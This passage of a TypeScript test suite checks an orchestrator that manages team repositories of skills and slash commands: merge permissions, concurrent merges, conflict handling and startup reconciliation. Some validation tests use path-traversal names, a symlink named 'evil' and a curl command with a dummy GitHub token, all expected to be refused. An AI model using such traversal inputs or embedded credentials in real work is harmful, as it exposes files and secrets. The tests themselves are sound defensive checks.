  it("given another team's owner, when they try to merge a request in the Payments repository, then it is refused and the default branch stays", async () => {
    // given
    const { ctx } = await seeded();
    const { bare, head } = await repoOf(ctx);
    await post(createApp(ctx, as(PAYMENTS_OWNER)), "/api/repos/payments-skills/changes", change(head));

    // when
    const res = await post(createApp(ctx, as(PLATFORM_OWNER)), "/api/repos/payments-skills/requests/1/merge", {});

    // then
    expect(res.status).toBe(403);
    expect(git(["rev-parse", "main"], bare).trim()).toBe(head);
  });

  it.each([
    ["a member", MEMBER],
    ["another team's owner", PLATFORM_OWNER],
  ])("given %s, when they merge, close or refresh a Payments request, then each is refused and the request stays open", async (_label, user) => {
    // given
    const { ctx } = await seeded();
    const { bare, head } = await repoOf(ctx);
    await post(createApp(ctx, as(PAYMENTS_OWNER)), "/api/repos/payments-skills/changes", change(head));
    const app = createApp(ctx, as(user));

    // when
    const answers = await Promise.all(["merge", "close", "refresh"].map(async (action) => post(app, `/api/repos/payments-skills/requests/1/${action}`, {})));

    // then
    expect(answers.map((r) => r.status)).toEqual([403, 403, 403]);
    expect((await answers[0]!.json()).error).toBe("only an admin or an owner of Payments can change this repository");
    expect(git(["rev-parse", "main"], bare).trim()).toBe(head);
    expect((await ctx.store.getRequest(ctx.tenant, "payments-skills", 1))!.status).toBe("open");
  });

  it("given three changes proposed at once, when they are opened, then each gets its own number and every branch has a request", async () => {
    // given
    const { ctx } = await seeded();
    const { bare, head } = await repoOf(ctx);
    const app = createApp(ctx, as(ADMIN));
    const skill = (slug: string) => ({ baseSha: head, message: `feat(skill): add ${slug}`, change: { kind: "skill.add", slug, content: SKILL(slug) } });

    // when
    const answers = await Promise.all(["one", "two", "three"].map((slug) => post(app, "/api/repos/payments-skills/changes", skill(slug))));

    // then
    expect(answers.map((r) => r.status)).toEqual([200, 200, 200]);
    const recorded = await ctx.store.listRequests(ctx.tenant, "payments-skills");
    expect(recorded.map((r) => r.number).sort()).toEqual([1, 2, 3]);
    const branches = git(["for-each-ref", "--format=%(refname:short)", "refs/heads/handbook"], bare).trim().split("\n").sort();
    expect(branches).toEqual(recorded.map((r) => r.branch).sort());
  });

  it.each([
    ["a member", MEMBER, 403],
    ["another team's owner", PLATFORM_OWNER, 403],
    ["this team's owner", PAYMENTS_OWNER, 200],
    ["an admin", ADMIN, 200],
  ])("given %s, when they ask for the Payments repository to be synced, then the answer is %s", async (_label, user, status) => {
    // given
    const { ctx } = await seeded();
    const before = (await ctx.store.getRepo(ctx.tenant, "payments-skills"))!.syncedAt;

    // when
    const res = await post(createApp(ctx, as(user)), "/api/repos/payments-skills/sync", {});

    // then
    expect(res.status).toBe(status);
    if (status === 403) {
      expect((await res.json()).error).toBe("only an admin or an owner of Payments can sync this repository");
      expect((await ctx.store.getRepo(ctx.tenant, "payments-skills"))!.syncedAt).toBe(before);
    }
  });

  it("given a page opened before the repository moved, when its change is sent, then it is refused as stale", async () => {
    const { ctx } = await seeded();
    const res = await post(createApp(ctx, as(ADMIN)), "/api/repos/payments-skills/changes", change("0".repeat(40)));
    expect(res.status).toBe(409);
  });
});

describe.each(["main", "master"])("a team repository whose default branch is %s", (target) => {
  it("given requests opened on it, when they are merged, then the ones that fit land on the default branch and the one that conflicts is refused by name", async () => {
    // given
    const { ctx } = await seeded(target);
    const { repo, mirror, bare, head } = await repoOf(ctx);
    const edit = (body: string, subject: string) => prepareChange(mirror, head, { kind: "skill.edit", slug: "release-checklist", content: SKILL("release-checklist", body) }, subject, "Pat");
    const a = await propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.add", slug: "on-call", content: SKILL("on-call") }, "feat(skill): add on-call", "Pat"));
    const b = await propose(ctx, repo, PAYMENTS_OWNER, await edit("- one way\n", "feat(skill): update release-checklist one way"));
    const c = await propose(ctx, repo, PAYMENTS_OWNER, await edit("- another way\n", "feat(skill): update release-checklist another way"));

    // when
    await mergeRequest(ctx, repo, a.number, PAYMENTS_OWNER);
    await mergeRequest(ctx, repo, b.number, PAYMENTS_OWNER);
    const conflicting = mergeRequest(ctx, repo, c.number, PAYMENTS_OWNER);

    // then
    await expect(conflicting).rejects.toThrow(`conflicts with ${target}`);
    expect(git(["rev-list", "--merges", "--count", `${head}..${target}`], bare).trim()).toBe("2");
    expect(git(["show", `${target}:skills/on-call/SKILL.md`], bare)).toContain("name: on-call");
    expect(git(["symbolic-ref", "--short", "HEAD"], bare).trim()).toBe(target);
    expect((await ctx.store.getRepo(ctx.tenant, repo.id))!.head).toBe(git(["rev-parse", target], bare).trim());
  });

  it("given a request whose branch is named like the other usual default branch, when it is opened and merged, then both work", async () => {
    // given
    const { ctx, root } = await seeded(target);
    const { repo, bare, head } = await repoOf(ctx);
    const other = target === "main" ? "master" : "main";
    const forge = createLocalForge(join(root, "work"), { nextNumber: (tenant, id) => ctx.store.nextRequestNumber(tenant, id) });

    // when
    const opened = await forge.open(repo, { title: "feat(skill): add on-call", body: "Adds on-call.", branch: other, baseSha: head, files: [{ path: "skills/on-call/SKILL.md", content: SKILL("on-call") }], author: { name: "Pat", email: "pat@example.invalid" } });
    const merged = await mergeLocalRequest(join(root, "work"), repo, other, { name: "Pat", email: "pat@example.invalid" });

    // then
    expect(git(["rev-parse", other], bare).trim()).toBe(opened.headSha);
    expect(git(["rev-parse", target], bare).trim()).toBe(merged);
    expect(git(["show", `${target}:skills/on-call/SKILL.md`], bare)).toContain("name: on-call");
  });
});

describe("adding, editing and removing a slash command from the orchestrator", () => {
  it("given a command in a folder, when it is added, then only its file under commands/ is written, named the way Claude Code types it", async () => {
    // given
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);

    // when
    const prepared = await prepareChange(mirror, head, { kind: "command.add", name: "git:sync", content: "---\r\ndescription: Bring the branch up to date.\r\n---\r\n\r\nFetch, then rebase." }, "feat(command): add /git:sync", "Ada");

    // then
    expect(prepared.files.filter((f) => f.path.startsWith("commands/"))).toEqual([{ path: "commands/git/sync.md", content: "---\ndescription: Bring the branch up to date.\n---\n\nFetch, then rebase.\n" }]);
    expect(prepared.body).toContain("Adds the slash command `/git:sync` (commands/git/sync.md)");
  });

  it("given the demo's /deploy-check, when it is edited and when it is removed, then the first rewrites its file and the second deletes it", async () => {
    // given
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);

    // when
    const edited = await prepareChange(mirror, head, { kind: "command.edit", name: "deploy-check", content: "Run every check and stop at the first failure.\n" }, "m", "Ada");
    const removed = await prepareChange(mirror, head, { kind: "command.delete", name: "deploy-check" }, "m", "Ada");

    // then
    expect(edited.files.find((f) => f.path === "commands/deploy-check.md")!.content).toBe("Run every check and stop at the first failure.\n");
    expect(removed.files.find((f) => f.path === "commands/deploy-check.md")!.content).toBeNull();
    expect(removed.body).toContain("Removes the slash command `/deploy-check` (commands/deploy-check.md)");
  });

  it.each([
    ["a credential in it", { kind: "command.add", name: "deploy", content: "Run: curl -H 'Authorization: Bearer ghp_aaaabbbbccccddddeeeeffff'\n" }, "/deploy is not shareable as written: commands/deploy.md line 1 looks like it contains a secret (github-token)"],
    ["a home directory in it", { kind: "command.add", name: "build", content: "cd /home/someone/work && make\n" }, "/build is not shareable as written: commands/build.md line 1 carries a trace of one machine"],
    ["a name that climbs out of commands/", { kind: "command.add", name: "../x", content: "Steps.\n" }, "a command name is lower-case letters, digits and dashes"],
    ["a removal under such a name", { kind: "command.delete", name: "../x" }, "a command name is lower-case letters, digits and dashes"],
    ["a name Windows keeps for a device", { kind: "command.add", name: "tools:con", content: "Steps.\n" }, "not a device name Windows keeps, such as con or nul"],
    ["no text", { kind: "command.add", name: "empty", content: "  \n" }, "the command's text is empty"],
    ["an addition under a name already there", { kind: "command.add", name: "deploy-check", content: "Steps.\n" }, "/deploy-check already exists; edit it instead"],
    ["an edit of a command that is not there", { kind: "command.edit", name: "nope", content: "Steps.\n" }, "there is no command /nope to edit"],
    ["a removal of a command that is not there", { kind: "command.delete", name: "nope" }, "there is no command /nope to remove"],
  ])("given %s, when the command is prepared, then it is refused", async (_label, change, message) => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    const refusal = await prepareChange(mirror, head, change, "m", "Ada").catch((err: Error) => err);
    expect((refusal as Error).message).toContain(message);
    expect((refusal as Error).message).not.toContain("ghp_aaaa");
  });

  it("given a command that passes the share rule and one that does not, when each is read for editing, then the first comes back whole and the second is withheld without its value", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { "commands/git/sync.md": "Fetch, then rebase.\n", "commands/deploy.md": "curl -H 'Authorization: Bearer ghp_aaaabbbbccccddddeeeeffff'\n" });
    await syncRepo(ctx, "payments-skills");
    const app = createApp(ctx, as(MEMBER));

    // when
    const sync = await app.request("/api/repos/payments-skills/commands/git:sync");
    const deploy = await app.request("/api/repos/payments-skills/commands/deploy");
    const climbing = await app.request(`/api/repos/payments-skills/commands/${encodeURIComponent("../../README")}`);

    // then
    expect((await sync.json()).content).toBe("Fetch, then rebase.\n");
    expect(deploy.status).toBe(409);
    const withheld = await deploy.text();
    expect(withheld).toContain("looks like it contains a secret (github-token)");
    expect(withheld).not.toContain("ghp_aaaa");
    expect(climbing.status).toBe(404);
  });

  it("given the demo's /deploy-check written again as it is, when the edit is prepared, then it is refused as unchanged", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    const current = git(["show", `${head}:commands/deploy-check.md`], mirror);
    await expect(prepareChange(mirror, head, { kind: "command.edit", name: "deploy-check", content: current }, "m", "Ada")).rejects.toThrow("/deploy-check is unchanged");
  });
});

describe("what waits to be merged in a team repository", () => {
  it.each([
    ["merged on the forge, in an answer from before", { number: 4, fromFork: false }, "merged"],
    ["closed on the forge, in an answer from before", { number: 4, fromFork: false }, "closed"],
    ["closed, its local branch left behind", { number: null, fromFork: false }, "closed"],
  ])("given a request of the orchestrator's %s, when what waits to be merged is marked, then it is left out", (_label, from, status) => {
    // given
    const request = { tenant: "t", repoId: "payments-skills", number: 4, provider: "local" as const, url: "local://requests/payments-skills/4", branch: "handbook/orchestrator-skill-on-call-0a1b2c", headSha: "a".repeat(40), title: "t", status: status as "merged" | "closed", createdAt: "2026-10-24T09:00:00Z", createdBy: "ada@example.invalid" };
    const listed = { ...from, title: "t", branch: request.branch, url: null, author: "Ada Example", updatedAt: "2026-10-24T09:00:00Z" };

    // when
    const marked = markOurs([listed], [request]);

    // then
    expect(marked).toEqual([]);
  });

  it.each([
    ["merge", "merged"],
    ["close", "closed"],
  ])("given a request the orchestrator opened and a look that read it, when the orchestrator %ss it, then the next look reads the forge again and does not list it as anyone's", async (action) => {
    // given
    const { ctx, root } = await seeded();
    const { bare, head } = await repoOf(ctx);
    const app = createApp(ctx, as(ADMIN));
    const opened = (await (await post(app, "/api/repos/payments-skills/changes", { baseSha: head, message: "chore(skill): remove release-checklist", change: { kind: "skill.delete", slug: "release-checklist" } })).json()).request;
    const look = async () => ((await (await app.request("/api/repos/payments-skills/pending")).json()).pending as { branch: string; byOrchestrator: boolean }[]).map((p) => [p.branch, p.byOrchestrator]);
    expect(await look()).toEqual([[opened.branch, true]]);
    const work = mkdtempSync(join(root, "teammate-share-"));
    git(["clone", "--quiet", bare, work], work);
    git(["checkout", "--quiet", "-b", "TEAM-9-meanwhile"], work);
    writeFileSync(join(work, "meanwhile.md"), "meanwhile\n");
    git(["add", "-A"], work);
    git(["commit", "--quiet", "-m", "feat(skill): a share meanwhile"], work);
    git(["fetch", "--quiet", work, "TEAM-9-meanwhile:TEAM-9-meanwhile"], bare);

    // when
    expect((await post(app, `/api/repos/payments-skills/requests/${opened.number}/${action}`, {})).status).toBe(200);

    // then
    expect(await look()).toEqual([["TEAM-9-meanwhile", false]]);
  });

  it("given a member looking again within half a minute, when a teammate pushed meanwhile, then the forge is not read again until the orchestrator itself opens a request", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare, head } = await repoOf(ctx);
    const app = createApp(ctx, as(ADMIN));
    const look = async () => ((await (await app.request("/api/repos/payments-skills/pending")).json()).pending as { branch: string }[]).map((p) => p.branch).sort();
    const first = await look();
    const work = mkdtempSync(join(root, "teammate-share-"));
    git(["clone", "--quiet", bare, work], work);
    git(["checkout", "--quiet", "-b", "TEAM-8-later"], work);
    writeFileSync(join(work, "later.md"), "later\n");
    git(["add", "-A"], work);
    git(["commit", "--quiet", "-m", "feat(skill): a later share"], work);
    git(["fetch", "--quiet", work, "TEAM-8-later:TEAM-8-later"], bare);

    // when
    const again = await look();
    const opened = (await (await post(app, "/api/repos/payments-skills/changes", { baseSha: head, message: "chore(skill): remove release-checklist", change: { kind: "skill.delete", slug: "release-checklist" } })).json()).request;
    const afterOpening = await look();

    // then
    expect(again).toEqual(first);
    expect(afterOpening).toEqual([...first, "TEAM-8-later", opened.branch].sort());
  });

  it("given a request the orchestrator opened, a teammate's share pushed by hand and a branch already merged, when a member looks, then the first two are listed and only the orchestrator's is marked as its own", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare, head } = await repoOf(ctx);
    const opened = (await (await post(createApp(ctx, as(ADMIN)), "/api/repos/payments-skills/changes", { baseSha: head, message: "chore(skill): remove release-checklist", change: { kind: "skill.delete", slug: "release-checklist" } })).json()).request;
    const work = mkdtempSync(join(root, "teammate-share-"));
    git(["clone", "--quiet", bare, work], work);
    git(["checkout", "--quiet", "-b", "TEAM-7-on-call"], work);
    writeFileSync(join(work, "notes.md"), "on call\n");
    git(["add", "-A"], work);
    git(["commit", "--quiet", "--author", "Grace Example <grace@example.invalid>", "-m", "feat(skill): share on-call"], work);
    git(["fetch", "--quiet", work, "TEAM-7-on-call:TEAM-7-on-call"], bare);
    git(["branch", "already-merged", "main"], bare);

    // when
    const res = await createApp(ctx, as(MEMBER)).request("/api/repos/payments-skills/pending");
    const { pending } = await res.json();

    // then
    expect(res.status).toBe(200);
    expect(pending.map((p: { branch: string }) => p.branch).sort()).toEqual([opened.branch, "TEAM-7-on-call"].sort());
    expect(pending.find((p: { branch: string }) => p.branch === "TEAM-7-on-call")).toMatchObject({ number: null, title: "feat(skill): share on-call", author: "Grace Example", url: null, byOrchestrator: false });
    expect(pending.find((p: { branch: string }) => p.branch === opened.branch)).toMatchObject({ number: opened.number, byOrchestrator: true });
  });

  it.each([
    ["the orchestrator's request, from this repository under its number", { number: 4, fromFork: false }, true],
    ["a fork's request under the orchestrator's branch name", { number: 9, fromFork: true }, false],
    ["this repository's request under the orchestrator's branch name but another number", { number: 9, fromFork: false }, false],
    ["a local branch of that name", { number: null, fromFork: false }, true],
  ])("given %s, when what waits to be merged is marked, then it is the orchestrator's only when it is", (_label, from, ours) => {
    // given
    const request = { tenant: "t", repoId: "payments-skills", number: 4, provider: "gitlab" as const, url: "https://gitlab.example.invalid/acme/payments-skills/-/merge_requests/4", branch: "handbook/orchestrator-skill-on-call-0a1b2c", headSha: "a".repeat(40), title: "t", status: "open" as const, createdAt: "2026-10-24T09:00:00Z", createdBy: "ada@example.invalid" };
    const listed = { ...from, title: "t", branch: request.branch, url: null, author: "someone", updatedAt: "2026-10-24T09:00:00Z" };

    // when
    const [marked] = markOurs([listed], [request]);

    // then
    expect(marked!.byOrchestrator).toBe(ours);
  });

  it("given a repository on a hosted forge with no access set, when its pending shares are asked for, then the answer says why nothing is read", async () => {
    // given
    const { ctx } = await seeded();
    const repo = (await ctx.store.getRepo(ctx.tenant, "payments-skills"))!;
    await ctx.store.upsertRepo({ ...repo, url: "https://git.example.invalid/acme/payments-skills.git" });

    // when
    const body = await (await createApp(ctx, as(MEMBER)).request("/api/repos/payments-skills/pending")).json();

    // then
    expect(body).toEqual({ pending: null, reason: "No forge access is set for this repository, so what waits to be merged there is not read." });
  });
});

describe("merging a request on the local forge", () => {
  async function twoRequests(ctx: OrchestratorContext, first: string, second: string) {
    const { repo, mirror, head } = await repoOf(ctx);
    const open = async (slug: string, body: string) =>
      propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.edit", slug: "release-checklist", content: SKILL("release-checklist", body) }, `feat(skill): update release-checklist ${slug}`, "Pat"));
    return [await open("a", first), await open("b", second)] as const;
  }

  it("given two requests that change one skill differently, when both are merged at once, then one lands, the other is refused as a conflict and stays open, and the default branch holds one merge", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare, head } = await repoOf(ctx);
    const [a, b] = await twoRequests(ctx, "- one way\n", "- another way\n");

    // when
    const results = await Promise.allSettled([mergeRequest(ctx, repo, a.number, PAYMENTS_OWNER), mergeRequest(ctx, repo, b.number, PAYMENTS_OWNER)]);

    // then
    const refused = results.find((r) => r.status === "rejected") as PromiseRejectedResult;
    expect(results.filter((r) => r.status === "fulfilled")).toHaveLength(1);
    expect(String(refused.reason.message)).toMatch(/conflicts with main/);
    expect(git(["rev-list", "--merges", "--count", `${head}..main`], bare).trim()).toBe("1");
    const statuses = (await ctx.store.listRequests(ctx.tenant, repo.id)).map((r) => r.status).sort();
    expect(statuses).toEqual(["merged", "open"]);
    const landed = git(["show", "main:skills/release-checklist/SKILL.md"], bare);
    expect(landed.includes("- one way") !== landed.includes("- another way")).toBe(true);
  });

  it("given two requests that change different skills, when both are merged at once, then both land one after the other", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, mirror, bare, head } = await repoOf(ctx);
    const a = await propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.delete", slug: "release-checklist" }, "chore(skill): remove release-checklist", "Pat"));
    const b = await propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.add", slug: "on-call", content: SKILL("on-call") }, "feat(skill): add on-call", "Pat"));

    // when
    const results = await Promise.allSettled([mergeRequest(ctx, repo, a.number, PAYMENTS_OWNER), mergeRequest(ctx, repo, b.number, PAYMENTS_OWNER)]);

    // then
    expect(results.map((r) => r.status)).toEqual(["fulfilled", "fulfilled"]);
    expect(git(["rev-list", "--merges", "--count", `${head}..main`], bare).trim()).toBe("2");
    expect(gitMaybe(["show", "main:skills/release-checklist/SKILL.md"], bare)).toBeNull();
    expect(git(["show", "main:skills/on-call/SKILL.md"], bare)).toContain("name: on-call");
  });


  it("given two merges of one request sent at once, when both run, then the default branch gets one merge commit and the second is told it is not open", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, mirror, bare, head } = await repoOf(ctx);
    const opened = await propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.delete", slug: "release-checklist" }, "chore(skill): remove release-checklist", "Pat"));

    // when
    const results = await Promise.allSettled([mergeRequest(ctx, repo, opened.number, PAYMENTS_OWNER), mergeRequest(ctx, repo, opened.number, ADMIN)]);

    // then
    expect(results.map((r) => r.status).sort()).toEqual(["fulfilled", "rejected"]);
    expect(git(["rev-list", "--merges", "--count", `${head}..main`], bare).trim()).toBe("1");
    expect((await ctx.store.getRequest(ctx.tenant, repo.id, opened.number))!.status).toBe("merged");
  });

  it("given a change through a symbolic link in the repository, when it is sent, then the answer is a 409 naming the link", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    const work = mkdtempSync(join(root, "linker-"));
    git(["clone", "--quiet", bare, work], work);
    symlinkSync(join(root, "elsewhere"), join(work, "skills", "evil"));
    git(["add", "-A"], work);
    git(["commit", "--quiet", "-m", "link"], work);
    git(["fetch", "--quiet", work, "main:main"], bare);
    await syncRepo(ctx, "payments-skills");
    const { head } = await repoOf(ctx);

    // when
    const res = await post(createApp(ctx, as(ADMIN)), "/api/repos/payments-skills/changes", {
      baseSha: head,
      message: "feat(skill): update evil",
      change: { kind: "skill.edit", slug: "evil", content: SKILL("evil") },
    });

    // then
    expect(res.status).toBe(409);
    expect((await res.json()).error).toMatch(/skills\/evil is a symbolic link/);
  });

  it("given an open request, when its team's owner merges it, then the default branch holds the change, the request reads merged, and the mirror has caught up", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, mirror, bare, head } = await repoOf(ctx);
    const opened = await propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.delete", slug: "release-checklist" }, "chore(skill): remove release-checklist", "Pat"));

    // when
    const merged = await mergeRequest(ctx, repo, opened.number, PAYMENTS_OWNER);

    // then
    expect(merged.status).toBe("merged");
    expect(gitMaybe(["show", "main:skills/release-checklist/SKILL.md"], bare)).toBeNull();
    expect((await ctx.store.getRequest(ctx.tenant, repo.id, opened.number))!.status).toBe("merged");
    expect((await ctx.store.getRepo(ctx.tenant, repo.id))!.head).toBe(git(["rev-parse", "main"], bare).trim());
    await expect(mergeRequest(ctx, repo, opened.number, PAYMENTS_OWNER)).rejects.toThrow(/is merged/);
  });
});

describe("a merge cut off, and the start after it", () => {
  async function opened2(ctx: OrchestratorContext, slug: string) {
    const { repo, mirror, head } = await repoOf(ctx);
    return propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.add", slug: `s-${slug}`, content: SKILL(`s-${slug}`) }, `feat(skill): add s-${slug}`, "Pat"));
  }

  async function opened(ctx: OrchestratorContext) {
    const { repo, mirror, head } = await repoOf(ctx);
    return propose(ctx, repo, PAYMENTS_OWNER, await prepareChange(mirror, head, { kind: "skill.delete", slug: "release-checklist" }, "chore(skill): remove release-checklist", "Pat"));
  }

  it("given a team repository deleted from its folder, when a request to it is merged, then the answer says the repository is no longer there", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare } = await repoOf(ctx);
    const request = await opened(ctx);
    rmSync(bare, { recursive: true, force: true });
    const app = createApp(ctx, as(PAYMENTS_OWNER));

    // when
    const res = await post(app, `/api/repos/${repo.id}/requests/${request.number}/merge`, {});

    // then
    expect(res.status).toBe(409);
    const { error } = (await res.json()) as { error: string };
    expect(error).toContain("is no longer there");
    expect(error).not.toContain("ENOENT");
    expect((await ctx.store.getRequest(ctx.tenant, repo.id, request.number))!.status).toBe("open");
  });

  it("given a team repository deleted from its folder, when a change to it is proposed, then the answer says the repository is no longer there", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare, head } = await repoOf(ctx);
    rmSync(bare, { recursive: true, force: true });
    const app = createApp(ctx, as(PAYMENTS_OWNER));

    // when
    const res = await post(app, `/api/repos/${repo.id}/changes`, { baseSha: head, message: "feat(skill): add on-call-handover", change: { kind: "skill.add", slug: "on-call-handover", content: SKILL("on-call-handover") } });

    // then
    expect(res.status).toBe(409);
    const { error } = (await res.json()) as { error: string };
    expect(error).toContain("is no longer there");
    expect(error).not.toContain("ENOENT");
  });

  it("given the orchestrator's copy of a repository deleted, when the repository is read, then the answer says the copy is missing and how it comes back, naming no folder of the orchestrator's, and a sync brings it back", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, mirror } = await repoOf(ctx);
    rmSync(mirror, { recursive: true, force: true });
    const app = createApp(ctx, as(PAYMENTS_OWNER));

    // when
    const read = await app.request(`/api/repos/${repo.id}/inventory`);

    // then
    expect(read.status).toBe(409);
    const { error } = (await read.json()) as { error: string };
    expect(error).toBe(MIRROR_GONE);
    expect(error).not.toContain(ctx.dataDir);

    // when the repository is synced
    await syncRepo(ctx, repo.id);

    // then
    expect((await app.request(`/api/repos/${repo.id}/inventory`)).status).toBe(200);
  });

  it("given a merge git cannot finish, when it fails part way, then the request is still open and the default branch has not moved", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare, head } = await repoOf(ctx);
    const request = await opened(ctx);
    git(["update-ref", "-d", `refs/heads/${request.branch}`], bare);

    // when
    const attempt = mergeRequest(ctx, repo, request.number, PAYMENTS_OWNER);

    // then
    await expect(attempt).rejects.toThrow();
    expect((await ctx.store.getRequest(ctx.tenant, repo.id, request.number))!.status).toBe("open");
    expect(git(["rev-parse", "main"], bare).trim()).toBe(head);
  });

  it("given a request a merge marked merged that never reached the default branch, when the orchestrator starts, then it is open again and can be merged", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare, head } = await repoOf(ctx);
    const request = await opened(ctx);
    await ctx.store.transitionRequest(ctx.tenant, repo.id, request.number, "open", "merged");

    // when
    const said = await reconcileLocalRequests(ctx);

    // then
    expect(said).toEqual([`payments-skills request #${request.number} was recorded merged but its branch is not in main; now open`]);
    expect((await ctx.store.getRequest(ctx.tenant, repo.id, request.number))!.status).toBe("open");
    await mergeRequest(ctx, repo, request.number, PAYMENTS_OWNER);
    expect(git(["rev-parse", "main"], bare).trim()).not.toBe(head);
  });

  it("given a request whose branch reached the default branch but whose record stayed open, when the orchestrator starts, then it is recorded as merged", async () => {
    // given
    const { ctx } = await seeded();
    const { repo } = await repoOf(ctx);
    const request = await opened(ctx);
    const { mergeLocalRequest } = await import("./forge/local.js");
    await mergeLocalRequest(join(ctx.dataDir, "work"), repo, request.branch, { name: "Pat", email: "pat@example.invalid" });

    // when
    await reconcileLocalRequests(ctx);

    // then
    expect((await ctx.store.getRequest(ctx.tenant, repo.id, request.number))!.status).toBe("merged");
  });

  it("given an orchestrator branch no request names, a branch a person made, and scratch directories, when the orchestrator starts, then only the orchestrator's own leftovers go", async () => {
    // given
    const { ctx } = await seeded();
    const { bare } = await repoOf(ctx);
    const kept = await opened(ctx);
    const head = git(["rev-parse", "main"], bare).trim();
    const orphan = git(["commit-tree", `${head}^{tree}`, "-p", head, "-m", "left by a stop"], bare).trim();
    git(["update-ref", "refs/heads/handbook/orchestrator-skill-orphan-abc123", orphan], bare);
    const person = { GIT_AUTHOR_NAME: "Person", GIT_AUTHOR_EMAIL: "person@example.invalid", GIT_COMMITTER_NAME: "Person", GIT_COMMITTER_EMAIL: "person@example.invalid" };
    const byHand = execFileSync("git", ["commit-tree", `${head}^{tree}`, "-p", head, "-m", "by hand"], { cwd: bare, encoding: "utf8", env: { ...process.env, ...person, GIT_CONFIG_GLOBAL: "/dev/null" } }).trim();
    git(["update-ref", "refs/heads/handbook/orchestrator-by-hand", byHand], bare);
    mkdirSync(join(ctx.dataDir, "work", "merge-AbC123"), { recursive: true });
    mkdirSync(join(ctx.dataDir, "work", "change-XyZ789"), { recursive: true });

    // when
    await reconcileLocalRequests(ctx);

    // then
    const branches = git(["for-each-ref", "--format=%(refname:short)", "refs/heads/handbook"], bare).trim().split("\n");
    expect(branches).not.toContain("handbook/orchestrator-skill-orphan-abc123");
    const aside = git(["for-each-ref", "--format=%(refname) %(objectname)", "refs/orchestrator/orphaned"], bare).trim();
    expect(aside).toMatch(new RegExp(`^refs/orchestrator/orphaned/[^/]+/heads/handbook/orchestrator-skill-orphan-abc123 ${orphan}$`));
    expect(branches).toContain("handbook/orchestrator-by-hand");
    expect(branches).toContain(kept.branch);
    expect(existsSync(join(ctx.dataDir, "work", "merge-AbC123"))).toBe(false);
    expect(existsSync(join(ctx.dataDir, "work", "change-XyZ789"))).toBe(false);
  });

  it("given one repository connected under two records, with open requests under the first, when the orchestrator starts, then no open request loses its branch or its description", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare } = await repoOf(ctx);
    await ctx.store.upsertRepo({ tenant: ctx.tenant, id: "payments-alias", team: "Payments", name: "payments-alias", url: repo.url.replace(/\/?$/, "/") });
    const opened = [await opened2(ctx, "one"), await opened2(ctx, "two"), await opened2(ctx, "three")];
    const notesBefore = opened.map((r) => git(["notes", "--ref", localDescriptionRef(r.branch), "show", `refs/heads/${r.branch}`], bare));

    // when
    const said = await reconcileLocalRequests(ctx);

    // then
    expect(said).toEqual([]);
    for (const [i, r] of opened.entries()) {
      expect(gitMaybe(["rev-parse", "--verify", "--quiet", `refs/heads/${r.branch}`], bare)).not.toBeNull();
      expect(git(["notes", "--ref", localDescriptionRef(r.branch), "show", `refs/heads/${r.branch}`], bare)).toBe(notesBefore[i]);
    }
    await mergeRequest(ctx, repo, opened[0]!.number, PAYMENTS_OWNER);
  });

  it("given an orchestrator branch no request names, when it is moved aside and then asked back, then the branch and its description return as they were", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare } = await repoOf(ctx);
    const request = await opened2(ctx, "lost");
    const head = git(["rev-parse", `refs/heads/${request.branch}`], bare).trim();
    const note = git(["notes", "--ref", localDescriptionRef(request.branch), "show", head], bare);
    await ctx.store.setRequestStatus(ctx.tenant, repo.id, request.number, "closed");
    const forgotten = openSqliteStore(":memory:");
    for (const r of await ctx.store.listRepos(ctx.tenant)) await forgotten.upsertRepo(r);

    // when the commands the start logs are run as written
    const said = await reconcileLocalRequests({ ...ctx, store: forgotten });
    const line = said.find((l) => l.includes(request.branch))!;
    const commands = line.slice(line.indexOf("in the repository, ") + "in the repository, ".length, line.lastIndexOf(" brings it back")).split(" && ");
    expect(commands).toHaveLength(2);
    for (const command of commands) git(command.replace(/^git /, "").split(" "), bare);

    // then
    expect(git(["rev-parse", `refs/heads/${request.branch}`], bare).trim()).toBe(head);
    expect(git(["notes", "--ref", localDescriptionRef(request.branch), "show", head], bare)).toBe(note);
  });

  it("given hundreds of requests on record, when the orchestrator starts, then each record is set right with a few git processes for the repository rather than some for every request", async () => {
    // given
    const { ctx, root } = await seeded();
    const { repo, bare } = await repoOf(ctx);
    const head = git(["rev-parse", "main"], bare).trim();
    const ahead = git(["commit-tree", `${head}^{tree}`, "-p", head, "-m", "not merged"], bare).trim();
    const refs: string[] = [];
    for (let n = 1; n <= 300; n++) {
      // A third merged but recorded open, a third recorded merged but not in main, a third with no branch left.
      const kind = n % 3;
      const branch = `handbook/orchestrator-many-${n}`;
      if (kind === 0) refs.push(`create refs/heads/${branch} ${head}`);
      if (kind === 1) refs.push(`create refs/heads/${branch} ${ahead}`);
